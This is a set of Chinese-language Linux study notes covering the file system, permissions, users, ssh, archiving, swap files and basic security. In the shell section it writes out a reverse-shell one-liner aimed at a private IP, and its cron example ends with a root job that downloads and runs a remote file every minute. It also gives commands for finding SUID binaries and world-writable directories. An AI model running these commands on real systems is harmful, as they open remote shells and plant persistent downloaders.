<link href="darkdown.css" rel="stylesheet"></link> 
<h1>Linux笔记</h1>
<p>Linux是常用的服务器操作系统，安全免费稳定且占有率高。</p>
<p>除企业服务器外，不需要杀毒。</p>
<h3>Linux文件系统</h3>
<p>Linux没有盘符概念，只有一个根目录，所有的文件都在根目录下。</p>
<blockquote>
<p>/</p>
<p>根目录，<strong>一般情况下只存放目录</strong>。</p>
<blockquote>
<p>/bin</p>
<p>与/usr/bin相同，存放二进制文件，通常是终端指令。</p>
<p>/sbin</p>
<p>系统bin目录，通常存储系统维护相关命令</p>
<p>/etc</p>
<p>系统配置文件存放位置，不应放置可执行文件。重要的文件有</p>
<blockquote>
<p>/etc/inittab</p>
<p>/etc/fstab</p>
<p>/etc/init.d</p>
<p>/etc/X11</p>
<p>/etc/sysconfig</p>
<p>/etx/xinetd.d</p>
</blockquote>
<p>/boot</p>
<p>放置启动时所需文件，比如内核/boot/vmlinuz，系统引导管理器/boot/grub</p>
<p>/dev</p>
<p>存放设备文件，访问文件等于访问设备，常用挂载光驱，mount /dev/cdrom /mnt</p>
<p>/home</p>
<p>表示系统的家目录，新增用户账号时，用户的家目录都在这个路径下。~表示自己家，~e表示e家。</p>
<p>/lib</p>
<p>/usr</p>
<blockquote>
<p>/usr/bin</p>
<p>存储用户后期安装的程序</p>
<p>/usr/sbin</p>
<p>超级用户存储后期安装的系统管理程序</p>
</blockquote>
</blockquote>
</blockquote>
<h3>文件用户权限</h3>
<pre><code class="language-shell">ls -l FileName
</code></pre>
<p>简写<code>ll</code>，显示格式： 权限 日期 文件名</p>
<pre><code>-rw-r--r-- 1 root root 91 May  7 20:21 monitor_log.sh
</code></pre>
<p>第一位表示文件类型， -表示文件，d表示目录。后三位为一组，第一组表示自己权限，第二组表示组权限，第三组表示所有人权限。</p>
<p>rxw可以用数字来表示。r==4; w==2; x==1; 后跟数字是硬链接数，第一个root表示root用户，第二个root表示root组，后面是修改时间，最后是文件名</p>
<p>硬链接数表示选中这个文件或文件夹的方式有几个</p>
<h3>Linux发行版</h3>
<p>linux发行版，也称为<strong>GNU/Linux 发行版</strong>，通常包含：办公桌面环境、办公套件、媒体播放器、数据库等。</p>
<p>常见的发行版如下</p>
<pre><code>Ubuntu、Redhat、Fedora、openSUSE、Linux Mint、Debian、Manjaro、Mageia、CentOS、Arch
</code></pre>
<h3>常用命令</h3>
<p><code>pwd</code>显示当前工作目录，</p>
<p><code>touch</code>创建文件，如果文件不存在，则创建目录。如果文件存在，则修改日期。</p>
<p><code>mkdir</code>创建目录，加入<code>-p</code>参数可以递归创建目录。</p>
<p><code>grep</code>查找，支持字符串和正则。<code>-n</code>显示行号，<code>-v</code>反选，<code>-i</code>忽略大小写。</p>
<p><code>ssh</code>远程链接<code>ssh -p port user@server</code></p>
<p><code>scp</code>远程复制<code>scp -P port 本地文件 user@server:path</code></p>
<p><code>which 命令</code>，可以查看当前命令的二进制文件存储位置</p>
<h3>ssh远程链接</h3>
<p>ssh配置文件都在home/user目录下的 .ssh目录下，可以使用ssh-keygen生成密钥，使用ssh-copy-id -p port user@server向服务器传送公钥，其中，密钥自己保存，公钥由服务器保存。</p>
<p>对于常链接的设备，可以使用别名来配置：路径<code>~/.ssh/config</code>，内容</p>
<pre><code>Host Name
	HostName ip
	User username
	Port 22
</code></pre>
<p>最后，只需要输入<code>ssh Name</code>即可链接</p>
<h3>用户权限</h3>
<p><code>chmod</code>修改文件或目录的访问权限<code>chmod (+/-)rwx file/path</code>例子<code>chmod +rwx root</code></p>
<h5>设置组</h5>
<p><code>groupadd name</code>添加组，<code>groupdel name</code>删除组，<code>cat /etc/group</code>查看组，<code>chgrp name path/file</code>修改文件目录所属组。这些指令<strong>需要根权限</strong></p>
<h5>设置用户</h5>
<p><code>useradd -m -g 组名 用户名</code>，-m自动添加家目录，-g设置组，否则自动创建组</p>
<p><code>passwd 密码 用户</code>用户只有被指定密码才可以登陆</p>
<p><code>userdel -r 用户名</code>移除用户，-r代表删除家目录</p>
<p><code>cat /etc/passwd|grep 用户名</code>，查看用户信息</p>
<p>这些指令<strong>需要根权限</strong></p>
<h5>查看用户信息</h5>
<p><code>id 用户名</code>，查看用户的UID和GID</p>
<p><code>who</code>查看当前所有登陆的用户列表</p>
<p><code>whoami</code>查看当前登陆帐号</p>
<p>使用<code>id</code>命令查看的信息存储在/etc/passwd和/etc/group下，passwd下信息是通过冒号分组表示的</p>
<p><code>Name:x:1002:1001::/home/Name:</code>对应的意义分别是<code>用户名:有密码且加密:用户UID:用户GID也称组ID:用户全名没有为空:家目录位置:登陆使用的ssh</code></p>
<blockquote>
<p>组信息：<code>Name:x:GID:USERS</code></p>
</blockquote>
<h5>设置用户所属组</h5>
<p>主组，附加组：主组通常在建立用户时指定，附加组通常代表用户的附加权限</p>
<p>修改用户主组：<code>usermod -g 用户名</code>，修改用户附加组：<code>usermod -G 用户名</code>，修改用户使用的shell：<code>usermod -s shell路径</code>，默认<code>/bin/bash</code></p>
<blockquote>
<p>通常，修改组之后重新登陆生效</p>
</blockquote>
<h5>设置shell</h5>
<p>通常，新用户使用的是dash，标准用户使用的是bash。</p>
<p><code>usermod -s /bin/bash 用户名</code>用来修改新用户使用的shell</p>
<p><code>bash -i&gt;&amp;/dev/tep/192.168.101.11/9999 0&gt;&amp;1</code>指定一个远程连接到<code>netcat</code>的一个<code>bash</code>，0代表标准输入，1代表标准输出</p>
<h5>su切换用户</h5>
<p><code>su - 用户名</code>可以切换到更高权限的用户，可以切换到root，如果不添加用户名，则保持工作目录不变且切换到root</p>
<p><code>su</code>切换到root，不改变工作目录</p>
<p><code>su r</code>切换到r，不改变工作目录</p>
<p><code>su - r</code>切换到r，切换工作目录</p>
<h5>修改文件权限</h5>
<p><code>chown Name Path/File</code>修改拥有者</p>
<p><code>chgrp -R Name Path/File</code>递归修改拥有组</p>
<p><code>chmod -R 755 Path/File</code>递归修改文件权限</p>
<h3>系统</h3>
<p><code>date</code>查看系统时间</p>
<p><code>cal</code>查看当月日历<code>-y</code>查看当年</p>
<p><code>df</code>查看磁盘存储信息，<code>-h</code>查看可以人性化的查看</p>
<p><code>du</code>查看文件占用大小，<code>-h</code>人性化查看，会刷屏</p>
<p><code>ps</code>查看进程情况，<code>ps aux</code>可以查看所有进程，<code>a</code>所有进程，<code>u</code>详细状态，<code>x</code>现实没有控制台的进程</p>
<p><code>top</code>检测进程信息，会阻塞控制台</p>
<p><code>kill</code>结束进程代号（PID)，<code>-9</code>表示强制结束</p>
<p><code>find</code>查找文件，<code>find Path -name &quot;FileName&quot;</code>查找指定的文件</p>
<p><code>ln</code>创建文件链接，<code>ln -s File Link</code>创建普通链接，<code>ln File Link</code>创建硬链接，推荐使用决对路径</p>
<h3>tar包的打包与压缩</h3>
<p><code>tar -cvf Name.tar Path/File</code>打包一个文件，<code>c</code>表示创建，<code>v</code>表示显示过程，<code>f</code>指定名称</p>
<p><code>tar -xvf Name.tar</code>解包文件，<code>-C</code>可以指定解压路径</p>
<p><code>gzip</code>才可以<strong>压缩</strong>文件，<strong>tar不能压缩</strong>文件，使用<code>gzip</code>打包的文件后缀是<code>.tar.gz</code>，在<code>tar</code>命令中，使用<code>-z</code>选项进行压缩和解压</p>
<p><code>bzip2</code>也可以压缩和解压，在<code>tar</code>中调用参数是<code>-j</code>，后缀是<code>.tar.bz2</code></p>
<h3>交换分区</h3>
<p>交换分区用于存储内存中使用频率较小的文件，通常使用量比例小，但对于图形界面系统来说，是需要拥有的分区。通常，大小在4G-8G之间。</p>
<p>本章内容是关闭默认分区以及创建交换文件作为交换分区，以实现硬盘利用最大化。</p>
<p><code>sudo swapoff /dev/xxx</code>关闭交换分区，<code>xxx</code>代表需要关闭的交换分区</p>
<p><code>swapon -s</code>检测开启的交换分区，如果没有输出任何内容（不包括换行符），则代表没有交换分区或分区关闭成功。</p>
<p><code>sudo dd if=/dev/zero of=/swapfile bs=1M count=交换文件大小(单位M) status=progress</code>使用dd刻录交换文件。</p>
<p><code>sudo chmod 600 /swapfile</code>调整权限，防止内存泄漏。</p>
<p><code>sudo mkswap /swapfile</code>设置为交换文件（现在才是真正的交换文件）。</p>
<p><code>sudo swapon /swapfile</code>临时开启交换文件。</p>
<p><code>swapon -s</code>如果没有任何问题，即可看到输出。</p>
<p><code>sudo nano /etc/fstab</code>注释掉原来的交换分区，写入新的交换文件挂载信息。</p>
<pre><code class="language-shell"># dev/nvme0n1p4 none swap defaults 0 0
/swapfile none swap defaults 0 0
</code></pre>
<p>通常看起来像以上这样调整即可，如果没有交换分区可以直接写入第二行。</p>
<h3>权限与安全</h3>
<h4>Linux权限</h4>
<p>读权限： r-4</p>
<p>写权限： w-2</p>
<p>执行权限： x-1</p>
<p>suid-4  程序设置suid时，任意用户执行程序，都以文件主权限运行。</p>
<p>sgid-2  程序设置sgid时，任意用户自行程序，都以拥有该文件的用户的组的权限运行。</p>
<p>sbit/t-1  当目录设置t权限后，在目录下的文件或子目录都仅允许root和拥有用户删除。</p>
<p>应用实例：</p>
<pre><code class="language-shell">chmod 4755 file
</code></pre>
<p>这将创建一个suid-4权限且为755权限的文件</p>
<pre><code class="language-shell">find / -perm /4000 2&gt;/dev/null
</code></pre>
<p>这将查询所有具有suid-4权限的文件，2为将失败信息输出到“黑洞”</p>
<h4>计划任务/定时任务</h4>
<p>文件位置：</p>
<ul>
<li>/etc/crontab</li>
<li>/var/spool/cron/</li>
<li>/var/spool/cron/crontabs/</li>
</ul>
<p>文件格式：</p>
<pre><code class="language-shell">SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
# 以上部分系统自动给出

# 文件格式
# .-----------------分钟（0-59）
# |  .--------------小时u（0-12）
# |  |  .-----------天（1-31）
# |  |  |  .--------月（1-12）
# |  |  |  |  .-----星期（0-6）
# |  |  |  |  |     
# *  *  *  *  *  user-name command

* * * * * root wget someurl &amp;&amp; ./someurl &amp;
</code></pre>
<h4>自启动</h4>
<p>文件位置：</p>
<ul>
<li>/etc/rc.d/init.d/</li>
<li>/etc/rc[0-6].d/</li>
<li>/etc/rc.local</li>
</ul>
<h4>任意用户可写</h4>
<ul>
<li>/tmp/</li>
<li>/var/tmp/</li>
<li>/dev/shm/</li>
<li>dev/mqueue</li>
</ul>
<p>查找命令 <code>find / -perm 1777</code>或<code>find / -perm 777 -type d</code></p>
<h4>后门检测</h4>
<p>可以使用<code>strings</code>命令进行元数据检测。</p>
<p>可以使用以下站点： <a href="https://ti.360.cn">360威胁情报中心</a>、<a href="https://x.threatbook.cn">微步在线</a></p>
<h4>病毒扫描</h4>
<p>主要依赖第三方</p>
<ul>
<li>chkrootkit</li>
<li>rkhunter</li>
<li>Gscan.py</li>
</ul>
